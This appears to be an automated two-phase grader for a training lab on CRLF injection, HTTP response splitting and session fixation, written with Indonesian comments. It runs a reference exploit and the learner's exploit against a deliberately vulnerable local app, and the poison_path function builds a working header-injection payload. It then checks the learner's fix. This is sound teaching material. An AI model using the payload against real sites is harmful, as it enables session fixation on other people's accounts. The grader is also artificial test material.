#!/usr/bin/env python3
"""Verifier otomatis 2 fase untuk Lab 15.

Rantai: CRLF injection -> HTTP response splitting -> session fixation,
ala Pi-hole CVE-2025-59151 (GHSA-5v79-p56f-x7c4, fixed di 6.3).

  Aplikasi "Shortlink Service": GET /r/<nama> me-redirect 302 ke
  /files/<nama> dengan <nama> yang sudah di-URL-decode direfleksikan
  ke header Location TANPA menetralkan CR/LF. Racun
  /r/%0d%0aSet-Cookie:%20session%3D<nilai> menyuntik header
  Set-Cookie arbitrer ke respons -> primitif session fixation
  (penyerang menetapkan nilai cookie session korban).

Alur:
  FASE 1 (pristine): bangun lab dari definisi rentan, pastikan
      - GET / -> 200
      - GET /login -> 200 + Set-Cookie session
      - GET /dashboard tanpa cookie -> 401; dengan cookie -> 200
      - GET /r/hello -> 302, Location == /files/hello
      - GET /files/hello -> 200
      - serangan referensi (health): solutions/exploit.py mencetak
        STATUS: 302 dan INJECTED: <marker>; header suntikan teramati
        di byte mentah respons
      - exploit/exploit.py milik learner dijalankan -> mencetak
        STATUS: 302 dan INJECTED: <marker>; verifier mengirim ulang
        racun dengan marker learner dan memastikan header
        Set-Cookie: session=<marker> muncul di respons mentah
  FASE 2 (dengan fix/): bangun ulang app dari fix/app, pastikan
      - GET /r/<racun> -> 400 (fail-closed), tidak ada header suntikan
      - fungsi normal utuh: /r/hello -> 302, /login, /dashboard, /files/

Deteksi scaffold (tanpa string TODO di file learner):
  - exploit: skrip scaffold me-raise NotImplementedError -> exit 3.
  - fix: isi fix/app/app.py identik byte-per-byte dengan app/app.py -> exit 2.

Exit code: 0 = kedua fase lulus, 1 = gagal, 2 = fase 2 belum dikerjakan,
           3 = fase 1 belum dikerjakan (exploit.py belum ada/belum diisi).
"""
import filecmp
import os
import re
import shutil
import socket
import subprocess
import sys
import time
from http.client import HTTPConnection
from urllib.parse import quote

LAB_DIR = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
HOST, PORT = "127.0.0.1", 8080
HEALTH_MARKER = "health-crlf-7x2q"
PASS, FAIL = "LULUS", "GAGAL"
results = []


def log(msg):
    print(msg, flush=True)


def check(name, ok, detail=""):
    results.append((name, ok))
    log("  [%s] %s%s" % (PASS if ok else FAIL, name, " -- " + detail if detail else ""))
    return ok


def run_compose(args):
    cmd = ["docker", "compose"] + args
    p = subprocess.run(cmd, cwd=LAB_DIR, capture_output=True, text=True, timeout=600)
    if p.returncode != 0:
        log("perintah gagal: %s\n%s" % (" ".join(cmd), p.stderr[-2000:]))
        sys.exit(1)
    return p


def req(path, headers=None, timeout=10):
    c = HTTPConnection(HOST, PORT, timeout=timeout)
    try:
        c.request("GET", path or "/", headers=headers or {})
        r = c.getresponse()
        h = {}
        for k, v in r.getheaders():
            h[k.lower()] = v
        return r.status, r.read(), h
    finally:
        c.close()


def raw_request(path, timeout=10):
    s = socket.create_connection((HOST, PORT), timeout=timeout)
    try:
        s.sendall(("GET %s HTTP/1.1\r\nHost: %s\r\nConnection: close\r\n\r\n"
                   % (path, HOST)).encode("latin-1"))
        data = b""
        while True:
            chunk = s.recv(4096)
            if not chunk:
                break
            data += chunk
        return data
    finally:
        s.close()


def poison_path(marker):
    return "/r/" + quote("\r\nSet-Cookie: session=" + marker, safe="")


def header_injected(raw, marker):
    want = ("Set-Cookie: session=" + marker).encode("latin-1")
    return any(line.strip() == want for line in raw.split(b"\r\n"))


def get_session_cookie():
    st, _, h = req("/login")
    cookie = ""
    for part in h.get("set-cookie", "").split(";"):
        if part.strip().startswith("session="):
            cookie = part.strip().split("=", 1)[1]
    return st, cookie


def reference_attack():
    exp = os.path.join(LAB_DIR, "solutions", "exploit.py")
    p = subprocess.run([sys.executable, exp], capture_output=True,
                       text=True, timeout=120, cwd=os.path.dirname(exp))
    return p.returncode, p.stdout or "", p.stderr or ""


def parse_exploit_output(out):
    m_status = re.search(r"^STATUS:\s*(\d{3})\s*$", out, re.MULTILINE)
    m_inj = re.search(r"^INJECTED:\s*(\S+)\s*$", out, re.MULTILINE)
    return ((m_status.group(1) if m_status else None),
            (m_inj.group(1) if m_inj else None))


def valid_marker(m):
    return bool(m) and re.fullmatch(r"[A-Za-z0-9_-]{1,64}", m)


def wait_up(timeout=150):
    log("menunggu lab siap di %s:%d ..." % (HOST, PORT))
    deadline = time.time() + timeout
    while time.time() < deadline:
        try:
            st, _, _ = req("/")
            if st == 200:
                return True
        except OSError:
            pass
        time.sleep(2)
    return False


def compose_down():
    run_compose(["-f", "docker-compose.yml", "-f", "docker-compose.fix.yml",
                 "down", "--remove-orphans"])


def main():
    if shutil.which("docker") is None:
        log("docker tidak ditemukan di PATH. Install Docker dulu lalu jalankan lagi.")
        sys.exit(1)

    log("== bersih-bersih container lama ==")
    compose_down()

    # ---------------- FASE 1 ----------------
    log("== FASE 1: membangun lab PRISTINE (rentan) ==")
    run_compose(["up", "-d", "--build"])
    if not wait_up():
        log("lab tidak siap (timeout).")
        sys.exit(1)

    st, _, _ = req("/")
    check("baseline: GET / -> 200", st == 200, "dapat %s" % st)

    st, cookie = get_session_cookie()
    check("fungsi normal: GET /login -> 200 + cookie session",
          st == 200 and bool(cookie), "dapat %s" % st)

    st, _, _ = req("/dashboard")
    check("fungsi normal: GET /dashboard tanpa sesi -> 401", st == 401,
          "dapat %s" % st)

    st, _, _ = req("/dashboard", headers={"Cookie": "session=" + cookie})
    check("fungsi normal: GET /dashboard dengan sesi -> 200", st == 200,
          "dapat %s" % st)

    st, _, h = req("/r/hello")
    check("fungsi normal: GET /r/hello -> 302 Location /files/hello",
          st == 302 and h.get("location") == "/files/hello",
          "dapat %s loc=%r" % (st, h.get("location")))

    st, _, _ = req("/files/hello")
    check("fungsi normal: GET /files/hello -> 200", st == 200,
          "dapat %s" % st)

    log("== [HEALTH] serangan referensi: CRLF -> injeksi Set-Cookie ==")
    rc, out, err = reference_attack()
    status, injected = parse_exploit_output(out)
    ok_ref = (rc == 0 and status == "302" and injected
              and header_injected(raw_request(poison_path(injected)), injected))
    check("serangan referensi: STATUS 302 + header Set-Cookie tersuntik",
          ok_ref, "dapat rc=%s status=%r injected=%r" % (rc, status, injected))
    if not ok_ref:
        log("LAB RUSAK: serangan referensi gagal di definisi pristine.")
        log("stderr: %s" % (err[-1500:] if err else "-"))
        compose_down()
        sys.exit(1)

    log("== FASE 1: reset ke pristine segar untuk exploit learner ==")
    compose_down()
    run_compose(["up", "-d", "--build"])
    if not wait_up():
        log("lab tidak siap (timeout).")
        sys.exit(1)

    log("== FASE 1: menjalankan exploit/exploit.py milik learner ==")
    exp = os.path.join(LAB_DIR, "exploit", "exploit.py")
    try:
        p = subprocess.run([sys.executable, exp], capture_output=True,
                           text=True, timeout=120, cwd=os.path.dirname(exp))
    except subprocess.TimeoutExpired:
        log("exploit.py melebihi 120 detik.")
        compose_down()
        sys.exit(1)
    if "NotImplementedError" in (p.stderr or ""):
        log("exploit.py masih scaffold (NotImplementedError). Kerjakan fase 1 dulu.")
        compose_down()
        sys.exit(3)
    status, injected = parse_exploit_output(p.stdout or "")
    check("exploit mencetak STATUS: 302", status == "302",
          "dapat %r" % status)
    check("exploit mencetak INJECTED (alfanumerik)", valid_marker(injected),
          "dapat %r" % injected)
    ok_inj = (valid_marker(injected)
              and header_injected(raw_request(poison_path(injected)), injected))
    check("INJECTED terbukti: header Set-Cookie tersuntik di respons",
          ok_inj, "dapat tersuntik=%s" % ok_inj)

    compose_down()

    # ---------------- FASE 2 ----------------
    log("== FASE 2: cek scaffold fix ==")
    pristine = os.path.join(LAB_DIR, "app", "app.py")
    fixed = os.path.join(LAB_DIR, "fix", "app", "app.py")
    if filecmp.cmp(pristine, fixed, shallow=False):
        log("fix/app/app.py masih identik dengan pristine. Kerjakan fase 2 dulu.")
        sys.exit(2)

    log("== FASE 2: membangun lab dengan FIX ==")
    run_compose(["-f", "docker-compose.yml", "-f", "docker-compose.fix.yml",
                 "up", "-d", "--build"])
    if not wait_up():
        log("lab tidak siap (timeout).")
        sys.exit(1)

    raw = raw_request(poison_path(HEALTH_MARKER))
    m = re.match(rb"HTTP/\S+ (\d{3})", raw)
    st = m.group(1).decode() if m else "000"
    check("serangan referensi GAGAL: GET /r/<racun> -> 400",
          st == "400", "dapat %s" % st)
    check("serangan referensi GAGAL: tidak ada header suntikan",
          not header_injected(raw, HEALTH_MARKER),
          "dapat tersuntik=%s" % header_injected(raw, HEALTH_MARKER))

    st, _, h = req("/r/hello")
    check("fungsi normal: GET /r/hello -> 302 Location /files/hello",
          st == 302 and h.get("location") == "/files/hello",
          "dapat %s loc=%r" % (st, h.get("location")))

    st, cookie2 = get_session_cookie()
    check("fungsi normal: GET /login -> 200 + cookie", st == 200 and bool(cookie2),
          "dapat %s" % st)
    st, _, _ = req("/dashboard", headers={"Cookie": "session=" + cookie2})
    check("fungsi normal: GET /dashboard dengan sesi -> 200", st == 200,
          "dapat %s" % st)
    st, _, _ = req("/files/x")
    check("fungsi normal: GET /files/x -> 200", st == 200, "dapat %s" % st)

    compose_down()

    failed = [n for (n, ok) in results if not ok]
    log("== HASIL: %d/%d cek lulus ==" % (len(results) - len(failed), len(results)))
    sys.exit(1 if failed else 0)


if __name__ == "__main__":
    main()
